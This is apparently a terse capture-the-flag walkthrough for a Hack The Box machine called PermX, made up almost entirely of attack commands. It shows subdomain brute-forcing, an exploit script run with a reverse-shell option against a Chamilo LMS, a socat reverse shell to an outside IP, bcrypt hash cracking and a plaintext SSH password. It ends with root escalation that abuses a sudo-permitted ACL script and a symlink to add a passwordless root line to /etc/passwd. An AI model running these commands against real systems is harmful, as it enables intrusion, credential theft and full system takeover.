- port 22, 80
- runs php

- http://permx.htb/lib/waypoints/links.php

```bash
cd /usr/share
sudo git clone https://github.com/danielmiessler/SecLists.git

gobuster dns -d permx.htb -w /usr/share/SecLists/Discovery/DNS/dns-Jhaddix.txt -t 50

gobuster dns -d permx.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt


/var/www/chamilo/app/config/configuration.php
python3 main.py  -u http://lms.permx.htb/ -a revshell


socat file:`tty`,raw,echo=0 tcp-listen:4444

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.167:4444

hashcat -m 3200 -a 0 -o cracked.txt bcrypt_hashes.txt C:/Users/henry/git/SecLists/Passwords/Leaked-Databases/rockyou.txt

hashcat -m 3200 -a 3 bcrypt_hashes.txt ?a?a?a?a?a?a


www-data@permx:/var/www/chamilo/app/config$ cat /etc/passwd|grep bash
root:x:0:0:root:/root:/bin/bash
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash


ssh mtz@permx.htb
03F6lY3uXAP2bkW8


mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh


sudo /opt/acl.sh mtz rw /home/mtz/execme.sh

echo '#!/bin/bash' > /home/mtz/execme.sh
echo '/bin/bash' >> /home/mtz/execme.sh
chmod +x /home/mtz/execme.sh
sudo /opt/acl.sh root rwx /home/mtz/execme.sh
sudo /home/mtz/execme.sh

ln -s /etc/passwd /home/mtz/symlink

sudo /opt/acl.sh mtz rw /home/mtz/symlink
echo 'rooted::0:0:root:/root:/bin/bash' >> /etc/passwd


```